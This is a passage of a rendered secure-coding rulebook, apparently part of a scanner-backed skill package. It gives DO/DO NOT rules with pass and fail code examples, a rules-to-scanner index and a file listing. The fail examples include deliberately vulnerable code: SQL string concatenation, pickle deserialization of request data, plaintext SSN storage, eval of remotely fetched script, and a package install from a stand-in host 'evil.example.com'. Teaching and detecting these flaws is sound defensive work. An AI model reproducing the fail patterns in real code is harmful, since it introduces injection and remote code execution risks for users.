+<pre><code>  logger.info(&quot;login attempt&quot;, extra={&quot;email&quot;: email, &quot;password&quot;: password})</code></pre>
+<ul>
+<li><strong>DO NOT</strong> use MD5, SHA1, or single-round SHA256 without salt for password storage.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  stored = hashlib.sha256(password.encode()).hexdigest()</code></pre>
+<p><strong>Source:</strong> `context/04-cryotiographic-failures/context/password-storage-cheat-sheet.md`</p>
+<h3>Rule: No plaintext sensitive data at rest</h3>
+<p>PII and regulated data (SSN, tax id, payment identifiers, health records) must be encrypted, tokenized, or otherwise protected before persistence. Plaintext storage in application databases or files fails this rule — distinct from password hashing (CWE-312, OWASP A02).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> encrypt or tokenize sensitive fields with envelope encryption or a KMS-backed data key before insert/update.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  encrypted_ssn = field_encryptor.encrypt(ssn, key_id=PII_KEY)
+  db.save_user(email=email, ssn_ciphertext=encrypted_ssn)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const token = await vault.tokenize(&#x27;ssn&#x27;, ssn);
+  await users.insert({ email, ssnToken: token });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  String ciphertext = piiCipher.encrypt(rawSsn);
+  userRepository.save(new User(email, ciphertext));</code></pre>
+<ul>
+<li><strong>DO</strong> store algorithm, key id, and version metadata needed for rotation and decryption.</li>
+</ul>
+<p><strong>Example (pass):</strong> Column `ssn_ciphertext` plus `encryption_key_id` and `cipher_version`.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> persist SSN, card numbers, or national ids from the request body without encryption.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  await Profile.create({ userId, ssn: req.body.ssn });</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  db.execute(&quot;INSERT INTO users (ssn) VALUES (%s)&quot;, (request.form[&quot;ssn&quot;],))</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  user.setSsn(request.getParameter(&quot;ssn&quot;));
+  userRepository.save(user);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> store reversible “encoding” (base64, hex) instead of cryptographic protection.</li>
+</ul>
+<p><strong>Example (fail):</strong> `stored = base64.b64encode(ssn.encode())` without encryption.</p>
+<p><strong>Source:</strong> `context/04-cryotiographic-failures/exercises-challenges/sensitive-data-storage-plain-text-storage-of-sensitive-info.md`, `context/04-cryotiographic-failures/context/password-storage-cheat-sheet.md`</p>
+<h3>Rule: No predictable session token</h3>
+<p>Session identifiers and authentication tokens must be generated with a cryptographically secure random number generator (CSPRNG) and sufficient entropy (128+ bits). Predictable session ids enable session hijacking, account takeover, and horizontal privilege escalation.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> use the framework session manager or `secrets` / `crypto.randomBytes` / `SecureRandom` for session id generation.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  import secrets
+  session_id = secrets.token_urlsafe(32)
+  session_store.save(session_id, user_id)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  req.session.regenerate((err) =&gt; {
+    // express-session generates high-entropy id server-side
+  });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  String sessionId = UUID.randomUUID().toString();
+  sessionRepository.create(sessionId, userId);</code></pre>
+<ul>
+<li><strong>DO</strong> rotate session id on login, privilege elevation, and logout; enforce idle and absolute timeouts server-side.</li>
+</ul>
+<p><strong>Example (pass):</strong> Invalidate server-side session record on logout; issue new session id after successful authentication.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> derive session ids from username, email, or numeric user id.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  req.session.id = req.body.username;</code></pre>
+<ul>
+<li><strong>DO NOT</strong> use incrementing counters, small random ranges, or `Math.random()` for session tokens.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  sessionId = String.valueOf(random.nextInt(100000));</code></pre>
+<p><strong>Source:</strong> `context/07_Authentication_Failures/context/improper-authentication.md`, `context/07_Authentication_Failures/exercises-challenges/weak-session-token-generation.md`</p>
+<p>See also: <strong>no-jwt-none-algorithm</strong>, <strong>no-client-side-auth-trust</strong> for token verification and client-side session state.</p>
+<h3>Rule: No secrets in log output</h3>
+<p>Logs often flow to centralized systems with broad access. Passwords, API keys, session tokens, and Authorization headers must never appear in log lines — even during debugging (CWE-532, OWASP A09).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> log security events with structured fields: event type, actor id, outcome, request id — not credential material.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  logger.info({
+    event: &#x27;login_failed&#x27;,
+    userId: user.id,
+    requestId: ctx.requestId,
+    outcome: &#x27;invalid_password&#x27;,
+  });</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  logger.warning(
+      &quot;authentication_failed&quot;,
+      extra={&quot;user_id&quot;: user_id, &quot;request_id&quot;: request_id},
+  )</code></pre>
+<ul>
+<li><strong>DO</strong> mask or omit token and session fields; hash session ids if correlation requires it.</li>
+</ul>
+<p><strong>Example (pass):</strong> Log `session_id_prefix=abc123…` (first 8 chars) only in debug tiers with RBAC.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> log raw passwords, API keys, or Authorization header values.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  logger.info(&quot;login attempt&quot;, extra={&quot;email&quot;: email, &quot;password&quot;: password})</code></pre>
+<ul>
+<li><strong>DO NOT</strong> log full JWT or reset tokens in info-level production logs.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  console.log(&#x27;token issued&#x27;, { token: jwt });</code></pre>
+<ul>
+<li><strong>DO NOT</strong> print secrets to stdout/stderr in production code paths.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  log.info(&quot;API call with key {}&quot;, apiKey);</code></pre>
+<p><strong>Source:</strong> `context/09_Logging_Alerting_Failures/context/insufficient-logging-and-monitoring.md`</p>
+<h3>Rule: No sensitive error disclosure</h3>
+<p>Error responses shown to end users must be generic. Detailed stack traces, framework versions, and file paths belong in secure internal logs correlated by request id — not in HTTP bodies.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> return a stable user message plus opaque reference id; log full diagnostics server-side.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  logger.error({ requestId, err });
+  res.status(500).json({ message: &#x27;An internal error occurred&#x27;, reference: requestId });</code></pre>
+<ul>
+<li><strong>DO</strong> disable framework debug pages in production deployments.</li>
+</ul>
+<p><strong>Example (pass):</strong> `app.set(&#x27;env&#x27;, &#x27;production&#x27;)` with centralized exception handler.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> send `err.stack`, Python tracebacks, or SQL error text to clients.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  res.status(500).send(err.stack);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> enable verbose SQL or ORM logging that echoes to API responses.</li>
+</ul>
+<p><strong>Example (fail):</strong> Returning `{ error: dbError.detail }` from a catch block on login failure.</p>
+<p><strong>Source:</strong> `context/10_Mishandling_of_Exceptional_Conditions/context/error-details.md`</p>
+<h3>Rule: No SQL string concatenation</h3>
+<p>Production database access must separate SQL structure from user-supplied data. Passing through bound parameters or an ORM&#x27;s safe API passes; building SQL with string concatenation, f-strings, or `.format()` with untrusted values fails because the database cannot distinguish code from data.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> use parameterized queries / prepared statements for every dynamic value in SQL.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  cur.execute(&quot;SELECT balance FROM accounts WHERE user_name = %s&quot;, (customer_name,))</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  await pool.query(&#x27;SELECT balance FROM accounts WHERE user_name = $1&#x27;, [customerName]);</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  PreparedStatement ps = conn.prepareStatement(
+      &quot;SELECT balance FROM accounts WHERE user_name = ?&quot;);
+  ps.setString(1, customerName);</code></pre>
+<ul>
+<li><strong>DO</strong> allow-list dynamic identifiers (table, column, sort direction) when they cannot be bound.</li>
+</ul>
+<p><strong>Example (pass):</strong> Map `sort=price` to a fixed enum `ORDER BY price ASC` — never interpolate raw user strings into identifier positions.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> concatenate or interpolate user input into SQL text.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  query = f&quot;SELECT * FROM users WHERE name = &#x27;{username}&#x27;&quot;
+  cur.execute(query)</code></pre>
+<ul>
+<li><strong>DO NOT</strong> use ORM `raw()` / string SQL with embedded variables.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> build JDBC SQL with string concatenation or `String.format`.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  stmt.executeQuery(&quot;SELECT * FROM users WHERE name = &#x27;&quot; + username + &quot;&#x27;&quot;);</code></pre>
+<p><strong>Source:</strong> `context/05-injection-flaws/context/sql-injection-prevention-cheat-sheet.md`, `context/05-injection-flaws/exercises-challenges/sql-injection.md`</p>
+<h3>Rule: No TOCTOU outside lock</h3>
+<p>When shared mutable state (balances, inventory, quotas) is read then written, the read and write must occur inside the same critical section. Checking a condition before acquiring a lock creates a time-of-check to time-of-use (TOCTOU) race (CWE-367).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> perform check and update inside the same lock, transaction, or atomic DB operation.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  synchronized (sourceCard) {
+      if (sourceCard.getBalance() &lt; amount) throw new InsufficientFundsException();
+      sourceCard.debit(amount);
+      destCard.credit(amount);
+  }</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  UPDATE accounts SET balance = balance - :amt
+  WHERE id = :id AND balance &gt;= :amt;
+  -- check rows affected == 1</code></pre>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> validate shared state outside a lock then modify inside it.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  if (sourceCard.getBalance() &lt; amount) return false;
+  lock.lock();
+  sourceCard.debit(amount);
+  lock.unlock();</code></pre>
+<ul>
+<li><strong>DO NOT</strong> use read-modify-write on shared balances without transactions or row-level locking.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  if account.balance &lt; amount:
+      return False
+  with lock:
+      account.balance -= amount</code></pre>
+<p><strong>Source:</strong> `context/green_belt_assessment/e0523/challenge-10.md`, `context/10_Mishandling_of_Exceptional_Conditions/context/error-details.md` (concurrency section)</p>
+<h3>Rule: No unsafe deserialization</h3>
+<p>Untrusted serialized object graphs can execute attacker-controlled code or corrupt application state. Prefer JSON/DTO mapping with schema validation; never feed untrusted bytes to language-native deserializers.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> parse JSON (or similar text formats) into plain objects and map fields explicitly to domain types.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const dto = orderSchema.parse(JSON.parse(body));
+  const order = Order.fromDto(dto);</code></pre>
+<ul>
+<li><strong>DO</strong> verify signatures or HMACs on serialized payloads before parsing when integrity matters.</li>
+</ul>
+<p><strong>Example (pass):</strong> Reject payload when `verify_hmac(payload, signature, secret)` fails.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> call native deserializers on request bodies or message queue payloads.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  obj = pickle.loads(request.data)</code></pre>
+<ul>
+<li><strong>DO NOT</strong> use `yaml.load` without `SafeLoader` on external input.</li>
+</ul>
+<p><strong>Example (fail):</strong> `yaml.load(untrusted_yaml_string)`</p>
+<p><strong>Source:</strong> `context/08_Software_or_Data_Integrity_Failures/context/deserialization-of-untrusted-data.md`</p>
+<h3>Rule: No unsafe file upload handling</h3>
+<p>File uploads are a common path to remote code execution, path traversal, and denial of service. Production code must validate size, content type (magic bytes), and storage location — never trust client filenames, extensions, or `Content-Type` headers alone.</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> generate internal storage names (UUID) and map to metadata in the database.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  detected = magic.from_buffer(data, mime=True)
+  if detected not in ALLOWED_MIME:
+      raise InvalidUploadError(&quot;file type not allowed&quot;)
+  safe_name = f&quot;{uuid4().hex}.{ALLOWED_EXT[detected]}&quot;
+  storage.put(user_id, safe_name, data)</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  String safeName = UUID.randomUUID() + &quot;.&quot; + validatedExtension;
+  Path target = uploadRoot.resolve(safeName); // flat directory, no user segments
+  Files.copy(inputStream, target, StandardCopyOption.REPLACE_EXISTING);</code></pre>
+<ul>
+<li><strong>DO</strong> enforce per-file and per-account size limits before reading the full stream.</li>
+</ul>
+<p><strong>Example (pass):</strong> Reject when `Content-Length` or streamed byte count exceeds `MAX_UPLOAD_BYTES`.</p>
+<ul>
+<li><strong>DO</strong> scan uploads in an isolated worker; serve from a separate domain or signed URLs when possible.</li>
+</ul>
+<p><strong>Example (pass):</strong> Enqueue virus scan job; block download until scan status is `clean`.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> persist uploads using the client-provided original filename or extension alone.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  cb(null, file.originalname);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> allow uploads into web-root or executable directories.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  save_path = os.path.join(&quot;/var/www/html/uploads&quot;, request.files[&quot;doc&quot;].filename)</code></pre>
+<ul>
+<li><strong>DO NOT</strong> trust `Content-Type` or file extension without server-side magic-byte detection.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  if (file.mimetype === &#x27;image/png&#x27;) { store(file); }</code></pre>
+<p><strong>Source:</strong> `context/06-Insecure-Design/context/unrestricted-file-upload.md`, `context/06-Insecure-Design/exercises-challenges/File-Upload-Vulnerability-Unrestricted-File-Upload.md`</p>
+<h3>Rule: No untrusted component sources</h3>
+<p>Dependencies must come from trusted registries with integrity verification — not arbitrary URLs, git branches, or unverified JAR downloads. Supply-chain compromise starts when build scripts pull unaudited artifacts (CWE-829, OWASP A06).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> pin dependencies in lockfiles (`package-lock.json`, `poetry.lock`, Maven `dependencyManagement`) from official registries.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  &quot;dependencies&quot;: { &quot;lodash&quot;: &quot;4.17.21&quot; }</code></pre>
+<p>Resolved via `npm ci` against committed lockfile.</p>
+<ul>
+<li><strong>DO</strong> verify checksums/signatures in CI; scan with SBOM tools (Dependabot, Snyk, OWASP Dependency-Check).</li>
+</ul>
+<p><strong>Example (pass):</strong> CI fails when `mvn verify` detects dependency hash mismatch.</p>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> install packages directly from HTTP URLs or unverified git endpoints in production build scripts.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  pip install https://evil.example.com/package.tar.gz</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  &quot;dependency&quot;: &quot;git+http://unknown.host/lib.git#master&quot;</code></pre>
+<ul>
+<li><strong>DO NOT</strong> load executable code from remote URLs at runtime without signature verification.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  eval(await fetch(req.query.scriptUrl).then(r =&gt; r.text()));</code></pre>
+<p><strong>Source:</strong> `context/green_belt_assessment/e0523/challenge-7.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/Using-Components-From-Untrusted-Source.md`</p>
+<h3>Rule: No weak crypto algorithms</h3>
+<p>Cryptographic choices must match the threat: password hashing uses adaptive algorithms; transport uses TLS 1.2+; symmetric encryption uses modern AEAD; tokens use CSPRNG. Legacy digests and ciphers fail when used for security-sensitive operations (CWE-327, OWASP A02).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> use Argon2id, scrypt, bcrypt, or PBKDF2 for password hashing — not general-purpose digests.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  const hash = await bcrypt.hash(password, 12);</code></pre>
+<ul>
+<li><strong>DO</strong> use AES-GCM or ChaCha20-Poly1305 for authenticated encryption at rest when encryption is required.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  crypto.createCipheriv(&#x27;aes-256-gcm&#x27;, key, iv);</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</code></pre>
+<ul>
+<li><strong>DO</strong> use `secrets`, `crypto.randomBytes`, or `SecureRandom` for session tokens, reset links, and CSRF secrets.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  import secrets
+  token = secrets.token_urlsafe(32)</code></pre>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> use MD5 or SHA1 for password storage or integrity protection of security artifacts.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  stored = hashlib.md5(password.encode()).hexdigest()</code></pre>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  MessageDigest.getInstance(&quot;MD5&quot;);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> use `Math.random()`, `random.randint()`, or `java.util.Random` for session tokens or security nonces.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  const token = Math.floor(Math.random() * 1e6);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> accept JWT with `alg: none` or use SHA1withRSA in new signature code.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  jwt.sign(payload, secret, { algorithm: &#x27;none&#x27; });</code></pre>
+<p><strong>Source:</strong> `context/04-cryotiographic-failures/context/guildline-weak-algoithm-use.md`</p>
+<h3>Rule: No XXE in unsafe XML parser configuration</h3>
+<p>XML parsers that resolve external entities or DTDs can leak files, perform SSRF, or cause denial of service. Disable DTDs and external entities on every parser that processes untrusted XML (CWE-611, OWASP A05).</p>
+<h4>DO</h4>
+<ul>
+<li><strong>DO</strong> disable DTDs and external entity resolution on SAX/DOM/StAX parsers.</li>
+</ul>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+  factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+  factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</code></pre>
+<p><strong>Example (pass):</strong></p>
+<pre><code>  parser = defusedxml.ElementTree.parse(untrusted_stream)</code></pre>
+<ul>
+<li><strong>DO</strong> use defusedxml or equivalent hardening for Python; set `XMLConstants.FEATURE_SECURE_PROCESSING` where supported.</li>
+</ul>
+<h4>DO NOT</h4>
+<ul>
+<li><strong>DO NOT</strong> parse untrusted XML with default parser settings.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(inputStream);</code></pre>
+<ul>
+<li><strong>DO NOT</strong> enable external DTD or XInclude on parsers handling request bodies.</li>
+</ul>
+<p><strong>Example (fail):</strong></p>
+<pre><code>  etree.parse(untrusted_xml)  # lxml/xml.etree without defusedxml</code></pre>
+<p><strong>Source:</strong> `context/green_belt_assessment/e0523/challenge-7.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/Using-Components-From-Untrusted-Source.md` &lt;!-- execute_rules:bundle_rules:end --&gt;</p>
+<hr></div></details>
+<details class="entry-md-section" id="rules-index"><summary class="entry-md-section__summary">Rules index</summary><div class="entry-md-section__body"><p>Two-letter <strong>prefix</strong> = SCW context category (`context/category-index.md`). Each rule file sets `category:` in frontmatter. Machine-readable: `inputs/rules-index.json`.</p>
+<h3>Category prefixes</h3>
+<div class="md-table-wrap"><table class="md-table"><thead><tr><th>Prefix</th><th>Category</th><th>Context folder</th></tr></thead><tbody><tr><td><strong>cf</strong></td><td>Cryptographic failures</td><td>`04-cryotiographic-failures/`</td></tr><tr><td><strong>if</strong></td><td>Injection flaws</td><td>`05-injection-flaws/`</td></tr><tr><td><strong>id</strong></td><td>Insecure design</td><td>`06-Insecure-Design/`</td></tr><tr><td><strong>af</strong></td><td>Authentication failures</td><td>`07_Authentication_Failures/`</td></tr><tr><td><strong>df</strong></td><td>Software / data integrity failures</td><td>`08_Software_or_Data_Integrity_Failures/`</td></tr><tr><td><strong>lf</strong></td><td>Logging &amp; alerting failures</td><td>`09_Logging_Alerting_Failures/`</td></tr><tr><td><strong>ec</strong></td><td>Mishandling of exceptional conditions</td><td>`10_Mishandling_of_Exceptional_Conditions/`</td></tr><tr><td><strong>gb</strong></td><td>Green belt assessment</td><td>`green_belt_assessment/`</td></tr></tbody></table></div>
+<h3>Rules by prefix</h3>
+<div class="md-table-wrap"><table class="md-table"><thead><tr><th>Prefix</th><th>Rule</th><th>Scanner stem</th></tr></thead><tbody><tr><td><strong>cf</strong></td><td>no-plaintext-password-storage</td><td>`no_plaintext_password_storage_scanner.py`</td></tr><tr><td><strong>cf</strong></td><td>no-plaintext-sensitive-data-at-rest</td><td>`no_plaintext_sensitive_data_at_rest_scanner.py`</td></tr><tr><td><strong>cf</strong></td><td>no-weak-crypto-algorithms</td><td>`no_weak_crypto_algorithms_scanner.py`</td></tr><tr><td><strong>cf</strong></td><td>no-hardcoded-secrets</td><td>`no_hardcoded_secrets_scanner.py`</td></tr><tr><td><strong>if</strong></td><td>no-sql-string-concatenation</td><td>`no_sql_string_concatenation_scanner.py`</td></tr><tr><td><strong>if</strong></td><td>no-os-command-injection</td><td>`no_os_command_injection_scanner.py`</td></tr><tr><td><strong>if</strong></td><td>no-eval-dynamic-code-execution</td><td>`no_eval_dynamic_code_execution_scanner.py`</td></tr><tr><td><strong>if</strong></td><td>no-dangerous-xss-sinks</td><td>`no_dangerous_xss_sinks_scanner.py`</td></tr><tr><td><strong>if</strong></td><td>no-ldap-filter-injection</td><td>`no_ldap_filter_injection_scanner.py`</td></tr><tr><td><strong>af</strong></td><td>no-predictable-session-token</td><td>`no_predictable_session_token_scanner.py`</td></tr><tr><td><strong>af</strong></td><td>no-insufficient-login-rate-limiting</td><td>`no_insufficient_login_rate_limiting_scanner.py`</td></tr><tr><td><strong>af</strong></td><td>no-client-side-auth-trust</td><td>`no_client_side_auth_trust_scanner.py`</td></tr><tr><td><strong>af</strong></td><td>no-jwt-none-algorithm</td><td>`no_jwt_none_algorithm_scanner.py`</td></tr><tr><td><strong>df</strong></td><td>no-unsafe-deserialization</td><td>`no_unsafe_deserialization_scanner.py`</td></tr><tr><td><strong>df</strong></td><td>no-mass-assignment-from-request</td><td>`no_mass_assignment_from_request_scanner.py`</td></tr><tr><td><strong>df</strong></td><td>no-untrusted-component-sources</td><td>`no_untrusted_component_sources_scanner.py`</td></tr><tr><td><strong>df</strong></td><td>no-xxe-unsafe-xml-parser</td><td>`no_xxe_unsafe_xml_parser_scanner.py`</td></tr><tr><td><strong>id</strong></td><td>no-unsafe-file-upload-handling</td><td>`no_unsafe_file_upload_handling_scanner.py`</td></tr><tr><td><strong>id</strong></td><td>no-path-traversal-in-paths</td><td>`no_path_traversal_in_paths_scanner.py`</td></tr><tr><td><strong>id</strong></td><td>no-excessive-response-data</td><td>`no_excessive_response_data_scanner.py`</td></tr><tr><td><strong>ec</strong></td><td>no-sensitive-error-disclosure</td><td>`no_sensitive_error_disclosure_scanner.py`</td></tr><tr><td><strong>ec</strong></td><td>no-toctou-outside-lock</td><td>`no_toctou_outside_lock_scanner.py`</td></tr><tr><td><strong>lf</strong></td><td>no-secrets-in-log-output</td><td>`no_secrets_in_log_output_scanner.py`</td></tr><tr><td><strong>lf</strong></td><td>no-missing-security-event-logging</td><td>`no_missing_security_event_logging_scanner.py`</td></tr></tbody></table></div></div></details>
+</div>
+<hr class="entry-divider">
+<div class="entry-contents-files">
+<ul class="file-list file-list--root">
+<li class="file-list__folder"><details class="file-tree__details"><summary class="file-tree__summary"><strong>inputs/</strong><span class="file-meta"> → Folder (5 items).</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/inputs/batch-wiring.json" target="_blank" rel="noopener noreferrer"><strong>batch-wiring.json</strong></a><span class="file-meta"> → &quot;version&quot;: 1,</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/inputs/batch-wiring.md" target="_blank" rel="noopener noreferrer"><strong>batch-wiring.md</strong></a><span class="file-meta"> → Batch wiring — abd-secure-code</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/inputs/context-retrieval.md" target="_blank" rel="noopener noreferrer"><strong>context-retrieval.md</strong></a><span class="file-meta"> → Secure Code Warrior — context retrieval index</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/inputs/corpus-root.json" target="_blank" rel="noopener noreferrer"><strong>corpus-root.json</strong></a><span class="file-meta"> → &quot;description&quot;: &quot;Secure Code Warrior training corpus and regression fixtures (context + fixtures/).&quot;,</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/inputs/rules-index.json" target="_blank" rel="noopener noreferrer"><strong>rules-index.json</strong></a><span class="file-meta"> → &quot;categories&quot;: {</span></li>
+</ul></div></details></li>
+<li class="file-list__folder"><details class="file-tree__details"><summary class="file-tree__summary"><strong>rules/</strong><span class="file-meta"> → Practice rules (DO/DON&#x27;T) and constraints used with scanners.</span></summary><div class="file-tree__inner"><ul class="file-list file-list--nested file-tree__ul">
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-client-side-auth-trust.md" target="_blank" rel="noopener noreferrer"><strong>no-client-side-auth-trust.md</strong></a><span class="file-meta"> → scanner: no_client_side_auth_trust_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-dangerous-xss-sinks.md" target="_blank" rel="noopener noreferrer"><strong>no-dangerous-xss-sinks.md</strong></a><span class="file-meta"> → scanner: no_dangerous_xss_sinks_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-eval-dynamic-code-execution.md" target="_blank" rel="noopener noreferrer"><strong>no-eval-dynamic-code-execution.md</strong></a><span class="file-meta"> → scanner: no_eval_dynamic_code_execution_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-excessive-response-data.md" target="_blank" rel="noopener noreferrer"><strong>no-excessive-response-data.md</strong></a><span class="file-meta"> → scanner: no_excessive_response_data_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-hardcoded-secrets.md" target="_blank" rel="noopener noreferrer"><strong>no-hardcoded-secrets.md</strong></a><span class="file-meta"> → scanner: no_hardcoded_secrets_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-insufficient-login-rate-limiting.md" target="_blank" rel="noopener noreferrer"><strong>no-insufficient-login-rate-limiting.md</strong></a><span class="file-meta"> → scanner: no_insufficient_login_rate_limiting_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-jwt-none-algorithm.md" target="_blank" rel="noopener noreferrer"><strong>no-jwt-none-algorithm.md</strong></a><span class="file-meta"> → scanner: no_jwt_none_algorithm_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-ldap-filter-injection.md" target="_blank" rel="noopener noreferrer"><strong>no-ldap-filter-injection.md</strong></a><span class="file-meta"> → scanner: no_ldap_filter_injection_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-mass-assignment-from-request.md" target="_blank" rel="noopener noreferrer"><strong>no-mass-assignment-from-request.md</strong></a><span class="file-meta"> → scanner: no_mass_assignment_from_request_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-missing-security-event-logging.md" target="_blank" rel="noopener noreferrer"><strong>no-missing-security-event-logging.md</strong></a><span class="file-meta"> → scanner: no_missing_security_event_logging_scanner.py</span></li>
+<li class="file-tree__file"><a class="file-tree__file-link" href="../../practices/architecture-centric-engineering/skills/abd-secure-code/rules/no-os-command-injection.md" target="_blank" rel="noopener noreferrer"><strong>no-os-command-injection.md</strong></a><span class="file-meta"> → scanner: no_os_command_injection_scanner.py</span></li>
